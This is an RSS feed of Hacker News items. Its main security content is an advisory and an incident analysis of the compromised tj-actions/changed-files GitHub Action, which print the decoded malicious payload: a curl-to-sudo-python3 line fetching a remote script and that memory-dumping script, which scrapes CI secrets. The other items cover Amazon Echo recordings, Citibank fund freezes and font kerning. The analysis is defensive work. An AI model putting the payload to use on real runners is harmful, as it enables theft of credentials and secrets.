href="https://semgrep.dev/playground/r/10Uz5qo/semgrep.tj-actions-compromised">the detection rule in blocking mode immediately</a>: visit the rule, click “add to policy”, and select “blocking mode.”</p></li></ol></li></ol><ol start="2"><li><p><strong>Stop using </strong><code>tj-actions/changed-files</code><strong> immediately.</strong> Switch to a safer alternative or inline your file-change detection logic.</p><ol start="1"><li><p>Just removing it from the main branch of your repository won’t be enough — it could still run on other branches depending on how your actions are configured. So you need to remove it from <strong>all</strong> branches to be safe.</p></li><li><p>As an alternative, <a href="https://docs.github.com/en/organizations/managing-organization-settings/disabling-or-limiting-github-actions-for-your-organization#allowing-select-actions-and-reusable-workflows-to-run">GitHub has a feature that lets you allow-list GitHub actions</a> so you can ensure it won’t run, even if it’s still in your code.</p><ol start="1"><li><p>You’ll need a list of GitHub Actions used at your org. Run this query on your codebase:</p><pre><code>$ semgrep -e 'uses: $ACTION' -l yaml --json .github  | jq -r '.results[].extra.metavars["$ACTION"].abstract_content' | grep -vE '^(actions/|docker://|[.]/[.]github/|tj-actions/)' | awk -F'@' '{print $1 "@*,"}' | sort | uniq
DataDog/synthetics-ci-github-action@*,
actions-rs/toolchain@*,
astral-sh/setup-uv@*,
aws-actions/amazon-ecr-login@*,</code></pre></li><li><p>Remove tj-actions/changed-files from the list of GitHub Actions.</p></li><li><p>Go to GitHub settings and configure like this at:<br><a href="https://github.com/semgrep/semgrep-app/settings/actions">https://github.com/semgrep/semgrep-app/settings/actions</a><br><img src="https://semgrep.dev/assets/github-settings-configuration.png"></p></li></ol></li><li><p><strong>Generally, pin all GitHub Actions to specific commit SHAs (rather than version tags) you know are safe.</strong> In this case, it appears that all versions are compromised.</p></li><li><p><strong>Audit past workflow runs for signs of compromise.</strong> Check logs for suspicious outbound network requests. Prioritize repos where your CI runner logs are public, as secrets are dumped to stdout in the payload.</p></li></ol></li></ol><h3>Affected versions</h3><p>At time of writing (2025-03-14T23:55:00Z), we assessed by inspecting tag pointers in the source repo that all versions of tj-actions/changed-files are compromised. Users may verify with <code>git tag --points-at 0e58ed8</code> . See <a href="https://github.com/tj-actions/changed-files/commit/0e58ed8671d6b60d0890c21b07f8835ace038e67">commit 0e58ed8</a> in <a href="https://github.com/tj-actions/changed-files.">https://github.com/tj-actions/changed-files.</a></p><h3>Further reading</h3><ul><li><p><a href="https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised">StepSecurity’s Incident Analysis</a></p></li><li><p><a href="https://github.com/tj-actions/changed-files/issues/2463">https://github.com/tj-actions/changed-files/issues/2463</a></p></li><li><p><a href="https://www.cve.org/CVERecord?id=CVE-2023-51664">CVE-2023-51664</a></p></li></ul>
                  </div><div>
  <header>
    <h4>About</h4>
    <img src="https://semgrep.dev/build/assets/semgrep-logo-dark-F_zJCZNg.svg">
  </header>
  <p>
    Semgrep lets security teams partner with developers and shift left organically, without introducing friction. Semgrep gives security teams confidence that they are only surfacing true, actionable issues to developers, and makes it easy for developers to fix these issues in their existing environments. 
  </p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[New York Times shut down Tor Onion service (232 pts)]]></title>
            <link>https://open.nytimes.com/https-open-nytimes-com-the-new-york-times-as-a-tor-onion-service-e0d0b67b7482</link>
            <guid>43368183</guid>
            <pubDate>Fri, 14 Mar 2025 22:53:58 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://open.nytimes.com/https-open-nytimes-com-the-new-york-times-as-a-tor-onion-service-e0d0b67b7482">https://open.nytimes.com/https-open-nytimes-com-the-new-york-times-as-a-tor-onion-service-e0d0b67b7482</a>, See on <a href="https://news.ycombinator.com/item?id=43368183">Hacker News</a></p>
Couldn't get https://open.nytimes.com/https-open-nytimes-com-the-new-york-times-as-a-tor-onion-service-e0d0b67b7482: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[Tj-actions/changed-files GitHub Action Compromised – used by over 23K repos (152 pts)]]></title>
            <link>https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised</link>
            <guid>43367987</guid>
            <pubDate>Fri, 14 Mar 2025 22:29:46 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised">https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised</a>, See on <a href="https://news.ycombinator.com/item?id=43367987">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-blog-post=""><h2>Introduction</h2><p>We are actively investigating a critical security incident involving the tj-actions/changed-files GitHub Action. While our investigation is ongoing, we want to alert users so they can take immediate corrective actions. We will keep this post updated as we learn more. <a href="https://github.com/step-security/harden-runner" target="_blank">StepSecurity Harden-Runner</a> detected this issue through anomaly detection when an unexpected endpoint appeared in the network traffic. Based on our analysis, the incident started around 9:00 AM March 14th, 2025 Pacific Time (PT) / 4:00 PM March 14th, 2025 UTC. If you need any help investigating this issue, please contact us at support@stepsecurity.io</p><p>Update 1: Most versions of tj-actions/changed-files are compromised.</p><p>Update 2:&nbsp;We have detected multiple public repositories have leaked secrets in build logs. As these build logs are public, anyone can steal these secrets. If you maintain any public repositories that use this Action, please review the recovery steps immediately.</p><p>Update 3: GitHub has removed the tj-actions/changed-files Action. GitHub Actions workflows can no longer use this Action.</p><h2>Summary of the incident</h2><p>‍<br>The tj-actions/changed-files GitHub Action, which is currently used in over 23,000 repositories, has been compromised. In this attack, the attackers modified the action’s code and retroactively updated multiple version tags to reference the malicious commit. The compromised Action prints CI/CD secrets in GitHub Actions build logs. If the workflow logs are publicly accessible (such as in public repositories), anyone could potentially read these logs and obtain exposed secrets.</p><p>Our Harden-Runner solution flagged this issue when an unexpected endpoint appeared in the workflow’s network traffic. This anomaly was caught by Harden-Runner’s behavior-monitoring capability.</p><p>The compromised Action now executes a malicious Python script that dumps CI/CD secrets from the Runner Worker process. Most of the existing Action release tags have been updated to refer to the malicious commit mentioned below. Note: All these tags now point to the same malicious commit hash:<code>0e58ed8671d6b60d0890c21b07f8835ace038e67</code>, indicating the retroactive compromise of multiple versions.”</p><pre contenteditable="false"><code><span>$ git tag -l | </span><span>while</span><span> read -r tag ; </span><span>do</span><span> git show --format=</span><span>"$tag: %H"</span><span> --no-patch $tag ; done | sort -k2
</span><span>v1</span><span>.0</span><span>.0</span><span>: 0e58ed8671d6b60d0890c21b07f8835ace038e67
</span>...
<span>v35</span><span>.7</span><span>.7</span><span>-sec: 0e58ed8671d6b60d0890c21b07f8835ace038e67
</span>...
<span>v44</span><span>.5</span><span>.1</span><span>: 0e58ed8671d6b60d0890c21b07f8835ace038e67
</span>...
<span></span><span>v5</span><span>: 0e58ed8671d6b60d0890c21b07f8835ace038e67
</span>...</code></pre><p><a href="https://github.com/salolivares">@salolivares</a> has identified the malicious commit that introduces the exploit code in the Action.</p><p><a href="https://github.com/tj-actions/changed-files/commit/0e58ed8671d6b60d0890c21b07f8835ace038e67" target="_blank">https://github.com/tj-actions/changed-files/commit/0e58ed8671d6b60d0890c21b07f8835ace038e67</a></p><figure><p><img src="https://cdn.prod.website-files.com/673b71f0790aabf30bd30bf8/67d4b101b7691ea36bd42479_Screenshot%202025-03-14%20at%203.42.44%E2%80%AFPM.png" loading="lazy" alt=""></p></figure><p>The base64 encoded string in the above screenshot contains the exploit code. Here is the base64 decoded version of the code.<br>‍</p><pre contenteditable="false"><code><span>if</span><span> [[ </span><span>"$OSTYPE"</span><span> == </span><span>"linux-gnu"</span><span> ]]; then
</span><span>  B64_BLOB=</span><span>`curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' | sort -u | base64 -w 0 | base64 -w 0`</span><span>
</span>  echo $B64_BLOB
<span></span><span>else</span><span>
</span><span>  exit </span><span>0</span><span>
</span>fi
</code></pre><p>‍</p><p>Here is the content of https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py</p><pre contenteditable="false"><code><span>#!</span><span>/usr/</span><span>bin/env python3
</span>...

def get_pid():
<span>    # https:</span><span>//stackoverflow.com/questions/2703640/process-list-on-linux-via-python</span><span>
</span><span>    pids = [pid </span><span>for</span><span> pid </span><span>in</span><span> os.listdir(</span><span>'/proc'</span><span>) </span><span>if</span><span> pid.isdigit()]
</span>
<span>    </span><span>for</span><span> pid </span><span>in</span><span> pids:
</span><span>        </span><span>with</span><span> open(os.path.join(</span><span>'/proc'</span><span>, pid, </span><span>'cmdline'</span><span>), </span><span>'rb'</span><span>) </span><span>as</span><span> cmdline_f:
</span><span>            </span><span>if</span><span> b</span><span>'Runner.Worker'</span><span> </span><span>in</span><span> cmdline_f.read():
</span><span>                </span><span>return</span><span> pid
</span>
<span>    raise Exception(</span><span>'Can not get pid of Runner.Worker'</span><span>)
</span>
<span></span><span>if</span><span> __name__ == </span><span>"__main__"</span><span>:
</span>    pid = get_pid()
    print(pid)

<span>    map_path = f</span><span>"/proc/{pid}/maps"</span><span>
</span><span>    mem_path = f</span><span>"/proc/{pid}/mem"</span><span>
</span>
<span>    </span><span>with</span><span> open(map_path, </span><span>'r'</span><span>) </span><span>as</span><span> map_f, open(mem_path, </span><span>'rb'</span><span>, </span><span>0</span><span>) </span><span>as</span><span> mem_f:
</span><span>        </span><span>for</span><span> line </span><span>in</span><span> map_f.readlines():  # </span><span>for</span><span> each mapped region
</span><span>            m = re.match(r</span><span>'([0-9A-Fa-f]+)-([0-9A-Fa-f]+) ([-r])'</span><span>, line)
</span><span>            </span><span>if</span><span> m.group(</span><span>3</span><span>) == </span><span>'r'</span><span>:  # readable region
</span><span>                start = int(m.group(</span><span>1</span><span>), </span><span>16</span><span>)
</span><span>                end = int(m.group(</span><span>2</span><span>), </span><span>16</span><span>)
</span>                # hotfix: OverflowError: Python int too large to convert to C long
<span>                # </span><span>18446744073699065856</span><span>
</span><span>                </span><span>if</span><span> start &gt; sys.maxsize:
</span><span>                    </span><span>continue</span><span>
</span>                mem_f.seek(start)  # seek to region start
            
<span>                </span><span>try</span><span>:
</span>                    chunk = mem_f.read(end - start)  # read region contents
                    sys.stdout.buffer.write(chunk)
                except OSError:
<span>                    </span><span>continue</span></code></pre><p>‍</p><p>Even though GitHub shows renovate as the commit author, most likely the commit did not actually come up renovate bot. The commit is an un-verified commit, so likely the adversary provided renovate as the commit author to hide their tracks.</p><figure><p><img src="https://cdn.prod.website-files.com/673b71f0790aabf30bd30bf8/67d516607d85f7dcd6427f6c_Screenshot%202025-03-14%20at%2010.47.33%E2%80%AFPM.png" loading="lazy" alt=""></p></figure><p><a href="https://github.com/step-security/harden-runner" target="_blank">StepSecurity Harden-Runner</a> secures CI/CD workflows by controlling network access and monitoring activities on GitHub-hosted and self-hosted runners. The name "Harden-Runner" comes from its purpose: strengthening the security of the runners used in GitHub Actions workflows. The Harden-Runner community tier is free for open-source projects. In addition, it offers several enterprise features.</p><p>‍</p><h2>Reproducing the Exploit</h2><p>When this Action is executed with Harden-Runner, you can see the malicious code in action. We reproduced the exploit in a test repository. When the compromised <code>tj-actions/changed-files</code> action runs, Harden-Runner’s insights clearly show it downloading and executing a malicious Python script that attempts to dump sensitive data from the GitHub Actions runner’s memory. You can see the behavior here: <a href="https://app.stepsecurity.io/github/step-security/github-actions-goat/actions/runs/13866127357" target="_blank"><br>https://app.stepsecurity.io/github/step-security/github-actions-goat/actions/runs/13866127357</a><br>‍<br>To reproduce this, you can run the following workflow:</p><pre contenteditable="false"><code><span>name: </span><span>"tj-action changed-files incident"</span><span>
</span>
<span></span><span>on</span><span>:
</span>  pull_request:
    branches:
      - main

<span></span><span>permissions</span><span>:
</span>  pull-requests: read

<span></span><span>jobs</span><span>:
</span>  changed_files:
    runs-on: ubuntu-latest
<span>    </span><span>name</span><span>: Test changed-files
</span><span>    </span><span>steps</span><span>:
</span>      - name: Harden Runner
<span>        </span><span>uses</span><span>: step-security/harden-runner@v2
</span><span>        </span><span>with</span><span>:
</span><span>          disable-sudo: </span><span>true</span><span>
</span>          egress-policy: audit

      - uses: actions/checkout@v4
<span>        </span><span>with</span><span>:
</span><span>          fetch-depth: </span><span>0</span><span>
</span>
<span>      # Example </span><span>1</span><span>
</span>      - name: Get changed files
<span>        </span><span>id</span><span>: changed-files
</span><span>        </span><span>uses</span><span>: tj-actions/changed-files@v35
</span>
      - name: List all changed files
<span>        </span><span>run</span><span>: |
</span><span>          </span><span>for</span><span> file </span><span>in</span><span> ${{ steps.changed-files.outputs.all_changed_files }}; </span><span>do</span><span>
</span><span>            echo </span><span>"$file was changed"</span><span>
</span>          done</code></pre><p>When this workflow is executed, you can see the malicious behavior through Harden-Runner:</p><p><a href="https://app.stepsecurity.io/github/step-security/github-actions-goat/actions/runs/13866127357" target="_blank">https://app.stepsecurity.io/github/step-security/github-actions-goat/actions/runs/13866127357</a></p><p>‍</p><figure><p><img src="https://cdn.prod.website-files.com/673b71f0790aabf30bd30bf8/67d4a976992a1fec9f2f5fdf_Screenshot%202025-03-14%20at%203.10.33%E2%80%AFPM.png" loading="lazy" alt=""></p></figure><figure><p><img src="https://cdn.prod.website-files.com/673b71f0790aabf30bd30bf8/67d4a9a39b13e0353099df3c_Screenshot%202025-03-14%20at%203.10.14%E2%80%AFPM.png" loading="lazy" alt=""></p></figure><p>When this workflow runs, you can observe the malicious behavior in the Harden-Runner insights page. The compromised Action downloads and executes a malicious Python script, which attempts to dump sensitive data from the Actions Runner process memory.</p><h2>Recovery Steps</h2><p>🚨 If you are using any version of the tj-actions/changed-files Action, we strongly recommend you stop using it immediately until the incident is resolved.</p><h3>Review Actions Inventory</h3><p>You should perform a code search across your repositories to discover all instances of the tj-actions/changed-files Action. For example, the following GitHub search URL shows all instances of this Action in the Actions GitHub organization:<br><a href="https://github.com/search?q=org%3Aactions%20tj-actions%2Fchanged-files%20Action&amp;type=code" target="_blank">https://github.com/search?q=org%3Aactions%20tj-actions%2Fchanged-files%20Action&amp;type=code</a><br>‍<br>Please note that this GitHub search does not always return accurate results. If you have dedicated source code search solutions such as SourceGraph, they could be more effective with finding all instances of this Action in use.</p><h3>Review GitHub Actions workflow run logs</h3><p>You should review logs for the recent executions of the Action and see if it has leaked secrets. Below is an example of how leaked secrets appear in build logs.</p><figure><p><img src="https://cdn.prod.website-files.com/673b71f0790aabf30bd30bf8/67d4cca074c5030ca60fd281_Screenshot%202025-03-14%20at%205.39.11%E2%80%AFPM.png" loading="lazy" alt=""></p></figure><p>‍</p><p>This step is especially important for public repositories since their logs are publicly accessible.</p><h3>For StepSecurity Enterprise Customers</h3><p>The following steps are applicable only for StepSecurity enterprise customers. If you are not an existing enterprise customer, you can start our 14 day free trial by installing <a href="https://github.com/apps/stepsecurity-actions-security" target="_blank">the StepSecurity GitHub App</a> to complete the following recovery step.</p><h4>Review Actions Inventory</h4><p>You can use the Actions inventory feature to discover all GitHub Actions workflows that are using tj-actions/changed-files.</p><figure><p><img src="https://cdn.prod.website-files.com/673b71f0790aabf30bd30bf8/67d4b492687d43d10aaaf409_Screenshot%202025-03-14%20at%203.57.53%E2%80%AFPM.png" loading="lazy" alt=""></p></figure><p>‍<br>‍</p><figure><p><img src="https://cdn.prod.website-files.com/673b71f0790aabf30bd30bf8/67d4bca8432050339dc719fd_Screenshot%202025-03-14%20at%204.32.37%E2%80%AFPM.png" loading="lazy" alt=""></p></figure><h4>StepSecurity Maintained changed-files Action</h4><p>We offer <a href="https://docs.stepsecurity.io/actions/stepsecurity-actions">secure drop-in replacements</a> for risky third-party Actions as part of our enterprise tier. We are currently in the process of onboarding this Action as a StepSecurity Maintained Action. Once onboarded, our enterprise customers can use the StepSecurity Maintained version of <em>tj-actions/changed-files </em>instead of the compromised versions.</p><h4>Review Harden-Runner Findings</h4><p>You can see if your workflows have called "gist.githubusercontent.com" by visiting "All Destinations" in your StepSecurity dashboard. If this endpoint appears in the list, review the workflow runs that called this endpoint.</p><figure><p><img src="https://cdn.prod.website-files.com/673b71f0790aabf30bd30bf8/67d4c1ab432050339dcae2dd_Screenshot%202025-03-14%20at%204.54.05%E2%80%AFPM.png" loading="lazy" alt=""></p></figure><h2>Next Steps</h2><p>We have reported this issue to GitHub and opened an issue in the affected repository:<br>🔗 <a href="https://github.com/tj-actions/changed-files/issues/2463" target="_blank">GitHub Issue #2463</a></p><p>The GitHub issue is no longer accessible as the repository has been deleted.</p><p>In addition, <a href="https://www.cve.org/CVERecord?id=CVE-2023-51664">an official CVE</a> has been published.</p><p>We will continue to monitor the situation and provide updates as more information becomes available.</p><p>For real-time security monitoring and proactive anomaly detection in GitHub Actions workflows, consider using <a href="https://github.com/step-security/harden-runner" target="_blank">Harden-Runner </a>to detect and mitigate such threats.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Everything you say to your Echo will be sent to Amazon starting on March 28 (210 pts)]]></title>
            <link>https://arstechnica.com/gadgets/2025/03/everything-you-say-to-your-echo-will-be-sent-to-amazon-starting-on-march-28/</link>
            <guid>43367536</guid>
            <pubDate>Fri, 14 Mar 2025 21:33:28 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://arstechnica.com/gadgets/2025/03/everything-you-say-to-your-echo-will-be-sent-to-amazon-starting-on-march-28/">https://arstechnica.com/gadgets/2025/03/everything-you-say-to-your-echo-will-be-sent-to-amazon-starting-on-march-28/</a>, See on <a href="https://news.ycombinator.com/item?id=43367536">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
          
          
<p>If that's not enough to deter you from sharing voice recordings with Amazon, note that the company allowed <a href="https://arstechnica.com/tech-policy/2019/04/amazon-admits-that-employees-review-small-sample-of-alexa-audio/">employees to listen to Alexa voice recordings.</a> In 2019, Bloomberg reported that Amazon employees listened to as many as 1,000 audio samples during their nine-hour shifts. Amazon <a href="https://www.amazon.com/gp/help/customer/display.html?nodeId=201602230">says</a> it allows employees to listen to Alexa voice recordings to train its speech recognition and natural language understanding systems.</p>
<p>Other reasons why people may be hesitant to trust Amazon with personal voice samples include the previous usage of Alexa voice recordings <a href="https://arstechnica.com/tech-policy/2018/11/amazon-must-give-up-echo-recordings-in-double-murder-case-judge-rules/">in criminal trials </a>and Amazon <a href="https://arstechnica.com/tech-policy/2023/06/ftc-amazon-ring-workers-illegally-spied-on-users-of-home-security-cameras/">paying a settlement</a> in 2023 in relation to allegations that it allowed "thousands of employees and contractors to watch video recordings of customers' private spaces" taken from Ring cameras, per the Federal Trade Commission.</p>
<h2>Save recordings or lose functionality</h2>
<p>Likely looking to get ahead of these concerns, Amazon said in its email today that by default, it will delete recordings of users’ Alexa requests after processing. However, anyone with their Echo device set to “Don’t save recordings” will see their already-purchased devices’ Voice ID feature bricked. Voice ID <a href="https://www.amazon.com/gp/help/customer/display.html?nodeId=GYCXKY2AB2QWZT2X">enables Alexa</a> to do things like share user-specified calendar events, reminders, music, and more. Previously, Amazon <a href="https://www.amazon.com/gp/help/customer/display.html?nodeId=201602230">has said</a> that "if you choose not to save any voice recordings, Voice ID may not work." As of March 28, broken Voice ID is a guarantee for people who don't let Amazon store their voice recordings.</p>
<p>Amazon's email says:</p>
<blockquote><p>Alexa voice requests are always encrypted in transit to Amazon’s secure cloud, which was designed with layers of security protections to keep customer information safe. Customers can continue to choose from a robust set of controls by visiting the Alexa Privacy dashboard online or navigating to More &gt; Alexa Privacy in the Alexa app.</p></blockquote>
<p>Amazon is forcing Echo users to make a couple of tough decisions: Grant Amazon access to recordings of everything you say to Alexa or stop using an Echo; let Amazon save voice recordings and have employees listen to them or lose a feature set to become more advanced and central to the next generation of Alexa.</p>
<p>However, Amazon is betting big that Alexa+ can dig the voice assistant out of a <a href="https://arstechnica.com/gadgets/2024/07/alexa-had-no-profit-timeline-cost-amazon-25-billion-in-4-years/">financial pit</a>. Amazon has publicly committed to keeping the free version of Alexa around, but Alexa+ is viewed as Amazon's last hope for keeping Alexa alive and making it profitable. Anything Amazon can do to get people to pay for Alexa takes precedence over other Alexa user demands, including, it seems, privacy.</p>


          
                  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[FBI, EPA, and Treasury told Citibank to freeze funds to claw back climate money (193 pts)]]></title>
            <link>https://techcrunch.com/2025/03/13/fbi-epa-and-treasury-told-citibank-to-freeze-funds-as-trump-administration-tries-to-claw-back-climate-money/</link>
            <guid>43366530</guid>
            <pubDate>Fri, 14 Mar 2025 19:52:17 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://techcrunch.com/2025/03/13/fbi-epa-and-treasury-told-citibank-to-freeze-funds-as-trump-administration-tries-to-claw-back-climate-money/">https://techcrunch.com/2025/03/13/fbi-epa-and-treasury-told-citibank-to-freeze-funds-as-trump-administration-tries-to-claw-back-climate-money/</a>, See on <a href="https://news.ycombinator.com/item?id=43366530">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
<p id="speakable-summary">Citibank revealed in court filings on Wednesday that the FBI, the EPA, the EPA inspector general, and the Treasury Department have all requested that the bank freeze accounts of several nonprofits and state government agencies.</p>

<p>The accounts were frozen in February, but the <a href="https://www.documentcloud.org/documents/25559919-citibank-ggrf-funds-lawsuit-filing-3-12-25/" target="_blank" rel="noreferrer noopener nofollow">new documents</a> make public details that had previously been unknown, including a full list of the nonprofits under FBI scrutiny.</p>







<p>The funds were disbursed as part of the $27 billion Greenhouse Gas Reduction Fund, which was created by the Inflation Reduction Act, a law <a href="https://techcrunch.com/2022/08/16/winners-losers-abound-as-inflation-reduction-act-becomes-law/">passed by Congress in 2022</a>. Of that, the EPA received <a href="https://techcrunch.com/2024/04/05/us-greenhouse-gas-reduction-fund/">$14 billion for a National Clean Investment Fund</a>, which provides grants to green banks.</p>

<p>Green banks use those funds to provide financing for clean technology projects around the country. Startups that have technologies that are ready to scale commercially were eligible to receive financing to make projects a reality.</p>

<p>The funding was mostly to be used for loans, which were to be paid back and recycled for future lending. Green banks tend to have delinquency rates on par with commercial and residential portfolios held by other commercial lenders.</p>

<p>Citibank was selected as the financial agent to administer that money, holding it in accounts under the names of the awardees. It is also administering a separate, $6 billion Clean Communities Investment Accelerator program. The EPA’s contract with Citibank was publicly announced in April 2024.</p>

<p>The FBI has requested that Citibank place 30-day administrative freezes on accounts held by nonprofits that were recipients of the green bank funding. It also asked the bank to freeze other nonprofit and state government agency accounts, including Habitat for Humanity, United Way, the Colorado Clean Energy Fund, and New York State Department of Taxation and Finance.</p>


<p>Three nonprofits that received green bank funds have sued Citibank, asking the bank to release the money in their accounts.</p>

<p>EPA administrator Lee Zeldin has said that the Greenhouse Gas Reduction Fund doesn’t align with the agency’s priorities and that he has concerns about fraud, though he has not provided evidence to support that claim.</p>

<p>In a hearing on Wednesday, a judge in the U.S. District Court for the District of Columbia questioned a Justice Department attorney representing the EPA.</p>







<p>“Can you proffer any evidence that [the grant] was illegal, or evidence of abuse or fraud or bribery — that any of that was improperly or unlawfully done, other than the fact that Mr. Zeldin doesn’t like it?” Judge Tanya Chutkan <a rel="nofollow" href="https://www.politico.com/news/2025/03/12/judge-epa-climate-grant-cancellations-00227643">said</a>.</p>

<p>Judge Chutkan also ordered the Justice Department to provide the court with details about the alleged fraud, “because I don’t have the credible evidence that’s required.”</p>

<p><em>Update 3/13/25: Added details from the Wednesday hearing.</em></p>
</div><div>
	
	
	
	

	
<div>
	<p>
		Tim De Chant is a senior climate reporter at TechCrunch. He has written for a wide range of publications, including Wired magazine, the Chicago Tribune, Ars Technica, The Wire China, and NOVA Next, where he was founding editor. De Chant is also a lecturer in MIT’s Graduate Program in Science Writing, and he was awarded a Knight Science Journalism Fellowship at MIT in 2018, during which time he studied climate technologies and explored new business models for journalism. He received his PhD in environmental science, policy, and management from the University of California, Berkeley, and his BA degree in environmental studies, English, and biology from St. Olaf College.	</p>
</div>


	
	<p>
		<a data-ctatext="View Bio" data-destinationlink="https://techcrunch.com/author/tim-de-chant/" data-event="button" href="https://techcrunch.com/author/tim-de-chant/">View Bio <svg style="width: 1em;" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><path fill="var(--c-svg, currentColor)" d="M16.5 12 9 19.5l-1.05-1.05L14.4 12 7.95 5.55 9 4.5z"></path></svg></a>
	</p>
	
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Kerning, the Hard Way (209 pts)]]></title>
            <link>https://home.octetfont.com/blog/kerning-hard.html</link>
            <guid>43366479</guid>
            <pubDate>Fri, 14 Mar 2025 19:47:12 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://home.octetfont.com/blog/kerning-hard.html">https://home.octetfont.com/blog/kerning-hard.html</a>, See on <a href="https://news.ycombinator.com/item?id=43366479">Hacker News</a></p>
<div id="readability-page-1" class="page"><article>

<time>2025-03-14</time>
<address>by David Jones</address>
<p>Here is a font i am working on; i hope you like it.</p>
<p><img alt="" src="https://home.octetfont.com/blog/image/kerninghard/010stork.png"></p>
<p>The letterforms are reversed out against a vertically striped background.
In a manner similar to <a href="https://fontsinuse.com/typefaces/32260/schaefer-versalien">Schaeffer
Versalien</a>.
The graphic effect is inspired-by/stolen-from Schaefer Versalien, but
the letterforms are modified from my found stencil font
<a href="https://drj11.itch.io/arugula-font">Arugula</a>.</p>
<p>Bear in the mind that with a font like this, the parts that are drawn
are the black parts.</p>
<p>So, let's consider a word like SALTY:</p>
<p><img alt="" src="https://home.octetfont.com/blog/image/kerninghard/020salty.png"></p>
<p>Looks okay? Perhaps you think is fine and there is nothing to comment on.</p>
<p>What about the kerning, in this case between <strong>L</strong> and <strong>T</strong>?
In the good old days of metal type the only kerns were when <code>/f</code> projected
outside the edge of its body.
This would not have been kerned and we were ok with that
(larger wooden type may have been kerned with a saw or a file, but
in this design, the cuts would have to be made to line up the stripes
exactly; tricky business).</p>
<p>Here’s what this particular example looks like without kerning:</p>
<p><img alt="" src="https://home.octetfont.com/blog/image/kerninghard/030saltynokern.png"></p>
<p>I’m not going to go back and forth over the merits of kerning,
i‘m here for the nerdy technical details.</p>
<p>In most, normal, fonts kerning is done with position rules (GPOS lookups);
that doesn’t work here, because if we reposition <strong>T</strong> to
be slightly further left, we get something like this disaster:</p>
<p><img alt="" src="https://home.octetfont.com/blog/image/kerninghard/040saltybad.png"></p>
<p>It looks a bit like <strong>L</strong> and <strong>T</strong> have been clipped, but in fact
they’ve been drawn over. Black parts of <strong>L</strong> overlap
the <strong>T</strong>, and vice versa: black parts of the
<strong>T</strong> overlap <strong>L</strong>.
The effect is what you can see, where <strong>L</strong> and <strong>T</strong> share a space,
the black bars overlap and are solid, obliterating the reversed out
letterforms.</p>
<p>So how do i kern this font, if not with GSPOS lookups?</p>
<p>With GSUB lookups! GSUB (for substitution) lookups substitute
one sequence of glyphs for another.
The details can get quite complicated, but the way i use them here
is relatively simple.</p>
<p>I split <strong>L</strong> and <strong>T</strong> into two pieces each, and recombine
the middle two pieces into the drawing of the kerned part.</p>
<p>I’ll illustrate the steps. With glyphs that have been articifically spaced out,
so that you can see each individual glyph.</p>
<p><strong>L</strong> and <strong>T</strong> as individual glyphs</p>
<p><img alt="" src="https://home.octetfont.com/blog/image/kerninghard/050LTspace.png"></p>
<p>Each of <strong>L</strong> and <strong>T</strong> is split into two pieces. So we get 4 glyphs:
<code>/L.left</code> <code>/L.right</code> <code>/T.left</code> <code>T.right</code>.
This is done with GSUB lookup rule like <code>sub L by L.left L.right ;</code>.</p>
<p><img alt="" src="https://home.octetfont.com/blog/image/kerninghard/060split.png"></p>
<p>The two middle pieces, <code>/L.right</code> and <code>T.left</code>, get replaced with
what i call a <em>joiner</em> the kerned piece in the middle shared by
both <strong>L</strong> and <strong>T</strong>.</p>
<p>Here the GSUB rules look like <code>sub L.right T.left by L_T.joiner ;</code>.</p>
<p><img alt="" src="https://home.octetfont.com/blog/image/kerninghard/070joined.png"></p>
<p>That’s actually it. The next image is just the previous one without
the extra spacing, and is how it would actually appear.</p>
<p><img alt="" src="https://home.octetfont.com/blog/image/kerninghard/080LTcomplete.png"></p>
<h2>Notes</h2>
<p>The pattern of vertical stripes means that kerns can only be a multiple
of the stripe repeat (not quite true, and i have sketched out more
general versions of this, but it <em>is</em> true for this font).</p>
<p>The gaps in the pattern help avoid solid black-to-black joins, which
might work when everything is a vector, but tend to leave sub-1-pixel
gaps when rasterised.
The gaps are also why a glyph isn’t split down the middle to
make the <code>.left</code> and <code>.right</code> parts.
That would leave a sub-1-pixel gap when rejoining.
Better to split at a gap.</p>
<p>The glyph names, used in the rules above, don’t matter at that level,
but i suspect affect the PDF; in particular cutting-and-pasting
from PDF, so there might be some tweaking of names.</p>
<p>For each letter (glyph) that participates in kerning, there
are two more glyphs for its <code>.left</code> and <code>.right</code> parts.
And...</p>
<p>For each <em>kerned pair</em> there is a glyph for its joiner, because
each one is unique.
Those are going to mount up quickly, which suggests kerning
only when strictly necessary.</p>
<p>None of the splits and joiners are drawn by hand, and
none of the GSUB rules are made by hand.
In both cases it is a <em>Small Matter of Programming</em>,
also known as Custom Python Scripts.
The libraries <a href="https://github.com/fonttools/fonttools">fontTools</a> and
<a href="https://github.com/simoncozens/fontFeatures">fontFeatures</a> were <em>invaluable</em> in this.</p>
<p>This font is not yet complete, but right now it is a real font and
really does work like this.
I've only kerned <strong>L</strong>, so there’s a few more kerns to do.
And right now is has a very basic alphabet, just A to Z;
i will draw some more letters and a few more decorative items, but
i plan for it to have a fairly small repertoire, partly because the
kerning and the vertical stripe design add to the constraints.</p>
<p>And if you thought kerning was problematic (and hopefully now you do),
consider how accents and other diacritics are going to work. ;)</p>
<h2>END</h2>
</article></div>]]></description>
        </item>
    </channel>
</rss>